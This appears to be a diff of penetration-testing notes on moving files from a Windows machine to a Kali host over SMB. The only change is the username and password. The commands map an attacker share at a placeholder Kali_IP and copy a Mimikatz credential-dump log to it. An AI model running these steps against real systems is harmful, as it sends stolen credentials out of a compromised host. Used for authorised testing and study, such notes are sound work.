@@ -17,11 +17,11 @@ Transfer From Windows to Kali
 1) SMB: 
 On Kali:
 ```bash
-impacket-smbserver test . -smb2support  -username kourosh -password kourosh
+impacket-smbserver test . -smb2support  -username ricardoqueso -password ricardoqueso
 ```
 On Windows:
 ```powershell
-net use m: \\Kali_IP\test /user:kourosh kourosh
+net use m: \\Kali_IP\test /user:ricardoqueso ricardoqueso
 copy mimikatz.log m:\
 ```
 2) RDP mounting shared folder:
